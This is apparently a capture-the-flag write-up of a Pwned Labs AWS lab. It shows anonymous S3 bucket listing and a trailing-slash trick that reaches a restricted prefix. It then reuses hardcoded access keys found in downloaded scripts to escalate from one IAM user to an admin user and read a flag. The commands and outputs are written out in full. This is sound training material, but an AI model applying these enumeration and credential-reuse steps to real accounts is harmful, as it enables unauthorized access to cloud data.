https://app.pwnedlabs.io/labs/aws-s3-enumeration-basics

### Scenario

It's your first day on the red team, and you've been tasked with examining a website that was found in a phished employee's bookmarks. Check it out and see where it leads! In scope is the company's infrastructure, including cloud services.

### Information provided

```
http://dev.huge-logistics.com
```

### Attack

Firstly, we check the page source of the site to get interesting information.

![](./images/Pasted%20image%2020260717234124.png)

![](./images/Pasted%20image%2020260717234146.png)

In the page source, we can see that the images used are stored in a `S3 bucket` which has a name 

```
dev.huge-logistics.com
```

![](./images/Pasted%20image%2020260718000752.png)

We are not able to view the contents using the web interface, we will try the CLI instead.
Now, we try to list the directories of this bucket without using valid credentials.

```
aws s3 ls s3://dev.huge-logistics.com --no-sign-request
```

```
Output:-

                           PRE admin/
                           PRE migration-files/
                           PRE shared/
                           PRE static/
2023-10-16 22:30:47       5347 index.html
```

Several directories are present, `admin` and `migration-files` directories look very interesting.

We try to list the objects present inside the above directories, however we are not able to because of less privileges. One thing is clear, we need more permissions to be able to access those directories which can happen if we are able to escalate our privileges.

```
aws s3 ls s3://dev.huge-logistics.com/admin --no-sign-request
```

```
Output:-

aws: [ERROR]: An error occurred (AccessDenied) when calling the ListObjectsV2 operation: Access Denied
```

We then try to list the objects present inside the `shared` directory.

```
aws s3 ls s3://dev.huge-logistics.com/shared --no-sign-request
```

```
Output:-

aws: [ERROR]: An error occurred (AccessDenied) when calling the ListObjectsV2 operation: Access Denied
```

We are not able to access the `shared` directory as well. However, if we add an extra `/` in the end of the path, we will be able to access it!

```
aws s3 ls s3://dev.huge-logistics.com/shared/ --no-sign-request
```

```
Output:-

2023-10-16 20:38:33          0 
2026-06-20 03:53:43       1877 hl_migration_project.zip
```

We will download this file present and inspect the contents.

```
aws s3 cp s3://dev.huge-logistics.com/shared/hl_migration_project.zip ./ --no-sign-request
```

After unzipping the file, we find a powershell script present with hardcoded access keys.

![](./images/Pasted%20image%2020260717235253.png)

We will use these Keys and login to the `aws cli` using `aws configure`

Once we login, we will check our identity.

```
aws sts get-caller-identity
```

```
Output:-

{
    "UserId": "AIDA3SFMDAPOYPM3X2TB7",
    "Account": "794929857501",
    "Arn": "arn:aws:iam::794929857501:user/pam-test"
}
```

It seems we have logged in as `pam-test`. Lets check if we can access any additional information using this.

```
aws s3 ls s3://dev.huge-logistics.com/admin/
```

```
Output:-

2023-10-16 20:38:38          0 
2024-12-02 20:27:44         32 flag.txt
2023-10-17 01:54:07       2425 website_transactions_export.csv
```

We can see the `flag.txt` file which seems like our end goal. However, we are not able to download the file or read its contents.

```
aws s3api get-object --bucket dev.huge-logistics.com --key admin/flag.txt -
```

```
Output:-

aws: [ERROR]: An error occurred (AccessDenied) when calling the GetObject operation: User: arn:aws:iam::794929857501:user/pam-test is not authorized to perform: s3:GetObject on resource: "arn:aws:s3:::dev.huge-logistics.com/admin/flag.txt" with an explicit deny in a resource-based policy
```

We are getting denied because of an explicit deny policy.

Next, we will try accessing the files present in the `migration-files` directory.

```
aws s3 ls s3://dev.huge-logistics.com/migration-files/
```

```
Output:-

2023-10-16 20:38:47          0 
2023-10-16 20:39:26    1833646 AWS Secrets Manager Migration - Discovery &                                        Design.pdf
2023-10-16 20:39:25    1407180 AWS Secrets Manager Migration - Implementation.pdf
2023-10-16 20:39:27       1853 migrate_secrets.ps1
2026-01-31 01:23:58       2494 test-export.xml
```

We will download these files into our own system and inspect them.

```
aws s3 cp s3://dev.huge-logistics.com/migration-files/migrate_secrets.ps1 ./secrets2.ps1
```

![](./images/Pasted%20image%2020260718000921.png)

We try using these keys since these are different, however we find out that these are no longer valid.

```
aws sts get-caller-identity
```

```
Output:-

aws: [ERROR]: An error occurred (InvalidClientTokenId) when calling the GetCallerIdentity operation: The security token included in the request is invalid.
```

We login using the old keys again and download the XML file where the keys are read from according to the logic inside the powershell script.

```
aws s3 cp s3://dev.huge-logistics.com/migration-files/test-export.xml ./
```

![](./images/Pasted%20image%2020260718001333.png)

We have received new keys now, which we will use to login.

```
aws sts get-caller-identity
```

```
Output:-

{
    "UserId": "AIDA3SFMDAPOWKM6ICH4K",
    "Account": "794929857501",
    "Arn": "arn:aws:iam::794929857501:user/it-admin"
}
```

Now we have logged in as `it-admin` which seems to be a highly privileged role. Lets try accessing the files inside the `admin` directory.

```
aws s3 cp s3://dev.huge-logistics.com/admin/flag.txt ./
```

**We got the flag!**

Now, we can check the bucket policy attached to our target bucket and check the permission levels to the resources present in it.

```
aws s3api get-bucket-policy --bucket dev.huge-logistics.com | jq -r '.Policy | fromjson'
```

```
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Sid": "PublicRead",
      "Effect": "Allow",
      "Principal": "*",
      "Action": "s3:GetObject",
      "Resource": [
        "arn:aws:s3:::dev.huge-logistics.com/shared/*",
        "arn:aws:s3:::dev.huge-logistics.com/index.html",
        "arn:aws:s3:::dev.huge-logistics.com/static/*"
      ]
    },
    {
      "Sid": "ListBucketRootAndShared",
      "Effect": "Allow",
      "Principal": "*",
      "Action": "s3:ListBucket",
      "Resource": "arn:aws:s3:::dev.huge-logistics.com",
      "Condition": {
        "StringEquals": {
          "s3:prefix": [
            "",
            "shared/",
            "static/"
          ],
          "s3:delimiter": "/"
        }
      }
    },
    {
      "Sid": "AllowAllExceptAdmin",
      "Effect": "Allow",
      "Principal": {
        "AWS": [
          "arn:aws:iam::794929857501:user/it-admin",
          "arn:aws:iam::794929857501:user/pam-test"
        ]
      },
      "Action": [
        "s3:Get*",
        "s3:List*"
      ],
      "Resource": [
        "arn:aws:s3:::dev.huge-logistics.com",
        "arn:aws:s3:::dev.huge-logistics.com/*"
      ]
    },
    {
      "Sid": "ExplicitDenyAdminAccess",
      "Effect": "Deny",
      "Principal": {
        "AWS": "arn:aws:iam::794929857501:user/pam-test"
      },
      "Action": "s3:*",
      "Resource": "arn:aws:s3:::dev.huge-logistics.com/admin/*"
    }
  ]
}
```

After reading the policy, it makes perfect sense! We now know what an anonymous user, `pam-test` and `it-admin` can do.



